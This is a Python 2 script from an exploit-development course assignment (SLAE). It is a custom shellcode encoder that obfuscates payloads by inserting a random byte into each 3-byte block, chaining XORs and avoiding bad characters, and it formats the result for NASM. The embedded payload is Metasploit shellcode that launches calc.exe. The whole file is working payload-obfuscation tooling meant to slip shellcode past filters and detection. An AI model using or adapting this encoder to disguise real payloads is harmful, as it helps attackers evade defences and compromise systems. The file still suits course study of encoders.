#!/usr/bin/python
 
# SLAE - Assignment #4: Custom Shellcode Encoder/Decoder (Linux/x86)
# Author:   Julien Ahrens (@MrTuxracer)
# Website:  http://www.rcesecurity.com 

from random import randint

# powered by Metasploit 
# windows/exec CMD=calc.exe 
# msfvenom -p windows/exec CMD=calc.exe -f python -e generic/none
# Encoder: Custom
shellcode = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

badchars = ["\x00","\x0a","\x0d","\x3b"]


def xorBytes(byteArray):
	# Randomize first byte
	rnd=randint(1,255)
	xor1=(rnd ^ byteArray[0])
	xor2=(xor1 ^ byteArray[1])
	xor3=(xor2 ^ byteArray[2])

	xorArray=bytearray()
	xorArray.append(rnd)
	xorArray.append(xor1)
	xorArray.append(xor2)
	xorArray.append(xor3)
	
	return cleanBadChars(byteArray, xorArray, badchars)

def cleanBadChars(origArray, payload, badchars):
	for k in badchars:
		# Ooops, BadChar found :( Do XOR stuff again with a new random value
		# This could run into an infinite loop in some cases
		if payload.find(k) >= 0:
			payload=xorBytes(origArray)
	
	return payload

def encodeShellcode (byteArr):
	shellcode=bytearray()
	shellcode.extend(byteArr)
	
	encoded=bytearray()
	tmp=bytearray()
	final=""

	# Check whether shellcode is aligned
	if len(shellcode) % 3 == 1:
		shellcode.append(0x90)
		shellcode.append(0x90)
	elif len(shellcode) % 3 == 2:
		shellcode.append(0x90)

	# Loop to split shellcode into 3-byte-blocks
	for i in range(0,len(shellcode),3): 
		tmp_block=bytearray()
		tmp_block.append(shellcode[i])
		tmp_block.append(shellcode[i+1])
		tmp_block.append(shellcode[i+2])
			
		# Do the RND-Insertion and chained XORs
		tmp=xorBytes(tmp_block)
				
		# Some formatting things for easier use in NASM :)
		for y in tmp:
			if len(str(hex(y))) == 3:
				final+=str(hex(y)[:2]) + "0" + str(hex(y)[2:])+","
			else:
				final+=hex(y)+","
				
	return final[:-1]
			
print "Encoded Shellcode:\r"
print encodeShellcode(shellcode)
